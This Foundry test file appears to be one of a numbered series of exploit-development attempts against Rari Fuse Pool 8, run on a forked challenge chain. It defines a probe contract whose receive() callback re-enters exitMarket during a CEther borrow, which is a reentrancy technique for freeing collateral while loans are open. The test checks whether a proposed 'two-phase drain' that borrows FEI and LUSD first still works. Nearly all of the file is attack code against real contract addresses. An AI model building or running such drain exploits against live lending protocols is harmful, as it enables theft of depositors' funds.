// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Attempt52 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IComptrollerAttempt52 {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEtherAttempt52 {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICErc20Attempt52 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

/// @notice Hypothesis check for the requested Pool 8 two-phase drain.
/// @dev This probe borrows FEI and FRAX in normal top-level calls before triggering the
/// CEther callback. If those visible CErc20 debts already make `exitMarket(fDAI-8)` fail,
/// then hiding only the later ETH borrow cannot unlock the DAI collateral for the proposed
/// stablecoin drain.
contract Pool8SequentialStableBorrowProbe {
    IERC20Attempt52 internal constant DAI = IERC20Attempt52(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IComptrollerAttempt52 internal constant COMPTROLLER =
        IComptrollerAttempt52(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    ICEtherAttempt52 internal constant FETH = ICEtherAttempt52(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);
    ICErc20Attempt52 internal constant FDAI = ICErc20Attempt52(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
    ICErc20Attempt52 internal constant FFEI = ICErc20Attempt52(0xd8553552f8868C1Ef160eEdf031cF0BCf9686945);
    ICErc20Attempt52 internal constant FLUSD = ICErc20Attempt52(0x647A36d421183a0a9Fa62717a64B664a24E469C7);

    bool internal inEthBorrow;
    bool internal alreadyReentered;
    uint256 internal callbackExitCode;
    uint256 internal lastEthBorrowResult;

    /// @notice Deposits DAI collateral and takes normal top-level FEI/FRAX borrows.
    function setupAndBorrowStables(uint256 collateralDai, uint256 feiBorrow, uint256 lusdBorrow) external {
        require(DAI.approve(address(FDAI), collateralDai), "approve fDAI failed");
        require(FDAI.mint(collateralDai) == 0, "fDAI mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(FDAI);

        uint256[] memory enterResults = COMPTROLLER.enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");

        require(FFEI.borrow(feiBorrow) == 0, "fFEI borrow failed");
        require(FLUSD.borrow(lusdBorrow) == 0, "fLUSD borrow failed");
    }

    /// @notice Calls exitMarket without the CEther callback.
    function exitCollateralMarket() external returns (uint256) {
        return COMPTROLLER.exitMarket(address(FDAI));
    }

    /// @notice Triggers the small CEther borrow whose callback attempts the same exitMarket call.
    function triggerEthBorrow(uint256 ethBorrowAmount) external returns (uint256) {
        inEthBorrow = true;
        lastEthBorrowResult = FETH.borrow(ethBorrowAmount);
        inEthBorrow = false;
        return lastEthBorrowResult;
    }

    function feiDebt() external view returns (uint256) {
        return FFEI.borrowBalanceStored(address(this));
    }

    function lusdDebt() external view returns (uint256) {
        return FLUSD.borrowBalanceStored(address(this));
    }

    function reentered() external view returns (bool) {
        return alreadyReentered;
    }

    function exitCodeDuringCallback() external view returns (uint256) {
        return callbackExitCode;
    }

    receive() external payable {
        if (!inEthBorrow || msg.sender != address(FETH) || alreadyReentered) {
            return;
        }

        alreadyReentered = true;
        callbackExitCode = COMPTROLLER.exitMarket(address(FDAI));
    }
}

contract Attempt52 is Test {
    uint256 internal constant FORK_BLOCK = 14_684_686;
    uint256 internal constant EXPECTED_CHAIN_ID = 2401;

    uint256 internal constant COLLATERAL_DAI = 150_000_000e18;
    uint256 internal constant FEI_BORROW = 1_000_000e18;
    uint256 internal constant LUSD_BORROW = 1_000_000e18;
    uint256 internal constant ETH_TRIGGER_BORROW = 2 ether;

    IComptrollerAttempt52 internal constant COMPTROLLER =
        IComptrollerAttempt52(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    ICEtherAttempt52 internal constant FETH = ICEtherAttempt52(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);

        vm.label(address(COMPTROLLER), "Pool8Comptroller");
        vm.label(address(FETH), "fETH-8");
    }

    /// @notice Verifies that sequential stable borrows stay visible and block the later collateral exit.
    /// @dev If this test passes, the requested "borrow FEI/FRAX first, then hide only the ETH borrow"
    /// extension is not broadcastable on the reset snapshot.
    function test_pool8_sequential_stable_borrows_still_block_exit_market() public {
        console.log("CHAIN_ID:", block.chainid);
        console.log("FORK_BLOCK:", block.number);
        console.log("POOL8_FETH_CASH:", FETH.getCash());

        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");
        assertGt(FETH.getCash(), ETH_TRIGGER_BORROW, "insufficient fETH cash for trigger borrow");

        uint256 baselineSnapshot = vm.snapshot();

        Pool8SequentialStableBorrowProbe directExitProbe = _seedProbe();
        _logLiquidity("DIRECT_EXIT_PROBE", address(directExitProbe));

        uint256 directFeiDebt = directExitProbe.feiDebt();
        uint256 directLusdDebt = directExitProbe.lusdDebt();
        uint256 directExitCode = directExitProbe.exitCollateralMarket();

        console.log("DIRECT_EXIT_FEI_DEBT:", directFeiDebt);
        console.log("DIRECT_EXIT_LUSD_DEBT:", directLusdDebt);
        console.log("DIRECT_EXIT_CODE:", directExitCode);

        assertGt(directFeiDebt, 0, "sequential FEI borrow did not stick");
        assertGt(directLusdDebt, 0, "sequential LUSD borrow did not stick");
        assertTrue(directExitCode != 0, "direct exitMarket unexpectedly succeeded after stable borrows");

        vm.revertTo(baselineSnapshot);

        Pool8SequentialStableBorrowProbe callbackProbe = _seedProbe();
        _logLiquidity("CALLBACK_PROBE", address(callbackProbe));

        uint256 ethBorrowResult = callbackProbe.triggerEthBorrow(ETH_TRIGGER_BORROW);
        uint256 callbackFeiDebt = callbackProbe.feiDebt();
        uint256 callbackLusdDebt = callbackProbe.lusdDebt();
        bool callbackReentered = callbackProbe.reentered();
        uint256 callbackExitCode = callbackProbe.exitCodeDuringCallback();

        console.log("CALLBACK_ETH_BORROW_RESULT:", ethBorrowResult);
        console.log("CALLBACK_FEI_DEBT:", callbackFeiDebt);
        console.log("CALLBACK_LUSD_DEBT:", callbackLusdDebt);
        console.log("CALLBACK_REENTERED:", callbackReentered);
        console.log("CALLBACK_EXIT_CODE:", callbackExitCode);

        assertEq(ethBorrowResult, 0, "fETH trigger borrow failed");
        assertTrue(callbackReentered, "CEther callback not reached");
        assertGt(callbackFeiDebt, 0, "FEI debt disappeared before callback");
        assertGt(callbackLusdDebt, 0, "LUSD debt disappeared before callback");
        assertTrue(callbackExitCode != 0, "callback exitMarket unexpectedly ignored visible stable debts");
    }

    function _seedProbe() internal returns (Pool8SequentialStableBorrowProbe probe) {
        probe = new Pool8SequentialStableBorrowProbe();
        deal(0x6B175474E89094C44Da98b954EedeAC495271d0F, address(probe), COLLATERAL_DAI);
        probe.setupAndBorrowStables(COLLATERAL_DAI, FEI_BORROW, LUSD_BORROW);
    }

    function _logLiquidity(string memory label, address account) internal view {
        (uint256 err, uint256 liquidity, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(account);
        console.log(label);
        console.log("LIQUIDITY_ERR:", err);
        console.log("LIQUIDITY:", liquidity);
        console.log("SHORTFALL:", shortfall);
    }
}
